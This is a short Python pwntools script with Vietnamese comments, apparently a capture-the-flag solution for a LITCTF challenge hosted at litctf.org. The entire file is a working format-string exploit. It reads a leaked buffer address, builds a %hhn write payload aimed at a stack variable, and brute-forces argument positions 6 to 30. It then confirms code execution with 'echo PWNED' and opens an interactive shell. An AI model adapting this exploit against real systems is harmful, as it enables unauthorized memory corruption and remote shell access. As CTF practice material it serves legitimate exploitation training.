from pwn import *

# Context setting
context.binary = elf = ELF('./main')
HOST = "litctf.org"
PORT = 31785

def exploit(offset_arg):
    try:
        p = remote(HOST, PORT, level='error')

        # Bước 1: Lấy địa chỉ và tính toán như cũ
        p.recvuntil(b'Buffer located at: ')
        buf_addr_str = p.recvline().strip()
        buf_addr = int(buf_addr_str, 16)
        
        offset = -8
        x_addr = buf_addr + offset

        # Bước 2: Xây dựng payload theo cấu trúc mới
        # Phần writer: ghi giá trị 1 vào địa chỉ được trỏ bởi đối số thứ `offset_arg`
        writer = f'%1c%{offset_arg}$hhn'.encode()

        # Phần padding: Đảm bảo payload được căn chỉnh 8 byte
        # để phần địa chỉ tiếp theo nằm đúng vị trí trên stack.
        padding_len = 8 - (len(writer) % 8)
        # Nếu writer đã dài đúng 8 byte, chúng ta cần thêm 8 byte padding
        # để đẩy địa chỉ sang slot tiếp theo.
        if padding_len == 0:
            padding_len = 8
            
        padding = b'A' * padding_len

        # Ghép lại payload: writer + padding + địa chỉ mục tiêu
        # Vị trí của x_addr sẽ là: (len(writer) + len(padding)) / 8
        # so với đầu buffer.
        payload = writer + padding + p64(x_addr)
        
        # Gửi payload
        p.sendline(payload)
        
        # Kiểm tra xem process còn sống không
        p.sendline(b'echo PWNED')
        response = p.recvuntil(b'PWNED', timeout=2)

        if b'PWNED' in response:
            log.success(f"SUCCESS! Argument position is: {offset_arg}")
            p.interactive()
            return True
        else:
            # Trường hợp này hiếm, có thể là do server phản hồi chậm
            log.warning(f"Position {offset_arg} did not crash, but no response.")
            p.close()

    except EOFError:
        # Đây là điều chúng ta mong đợi cho các offset sai
        # log.failure(f"Position {offset_arg} failed (process crashed).")
        p.close()
    except Exception as e:
        log.warning(f"Position {offset_arg} caused an error: {e}")
        p.close()
    
    return False

# Bắt đầu brute-force
# Trên server, stack thường lớn hơn, offset có thể cao hơn
# Chúng ta bắt đầu từ 6 và thử đến khoảng 30.
for i in range(6, 31):
    log.info(f"Trying argument position: {i}")
    if exploit(i):
        break